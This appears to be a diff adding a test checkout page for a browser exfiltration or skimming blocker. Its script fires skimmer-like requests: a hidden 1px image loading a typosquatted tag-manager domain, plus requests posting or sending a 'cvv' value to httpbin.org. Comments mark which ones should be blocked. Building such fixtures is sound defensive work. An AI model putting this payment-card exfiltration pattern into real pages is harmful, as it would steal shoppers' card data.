@@ -1,1 +1,47 @@
-test2
+<html>
+  <body>
+    TEST Checkout PAGE
+  </body>
+
+  <script>
+    // test GET (malicious URL) -> should be blocked
+    var b = document.createElement("img");
+    b.width = "1px";
+    b.height = "1px";
+    b.id = "hh";
+    b.src = "https://googletagsmanager.co/ntag.js";
+    document.body.appendChild(b);
+
+    // test POST (malicious data) -> should be blocked
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://httpbin.org/post", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(
+      JSON.stringify({
+        cvv: "cvv-test",
+      })
+    );
+
+    // test GET -> should be blocked
+    var b = document.createElement("img");
+    b.width = "1px";
+    b.height = "1px";
+    b.id = "hh";
+    b.src = "https://httpbin.org/get?cvv=323";
+    document.body.appendChild(b);
+
+    // test GET -> should not be blocked
+    var b = document.createElement("img");
+    b.width = "1px";
+    b.height = "1px";
+    b.id = "hh";
+    b.src = "https://httpbin.org/get?a=b";
+    document.body.appendChild(b);
+
+
+    let socket = new WebSocket("wss://echo.websocket.org");
+    socket.onopen = function(e) {
+      socket.send("hello");
+    };
+  </script>
+</html>
